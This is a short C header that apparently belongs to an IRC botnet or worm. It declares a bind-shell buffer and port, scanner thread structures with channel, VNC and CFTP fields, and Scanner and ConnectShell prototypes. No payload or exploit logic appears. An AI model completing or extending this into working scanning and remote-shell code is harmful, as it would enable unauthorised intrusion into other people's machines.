extern char bindshell[];
extern unsigned short bindport;

typedef struct SCANNER {
	SOCKET Sock;
	char IP[16];
	char CurrentChannel[128];
	unsigned int Threads;
	int Mode;
	int ThreadNum;
	int vncmode;
	BOOL UseCFTP;
	BOOL Silent;
	BOOL GotInfo;
}SCANNER;

typedef struct SCANTHREAD {
	SOCKET Sock;
	char IP[16];
	int Mode;
	BOOL UseCFTP;
	int vncmode;
	int ThreadNum;
	BOOL GotInfo;
}SCANTHREAD;

DWORD WINAPI Scanner(LPVOID param);
BOOL ConnectShell(SOCKET Sock, char IP[16], unsigned int connectport, BOOL UseCFTP);
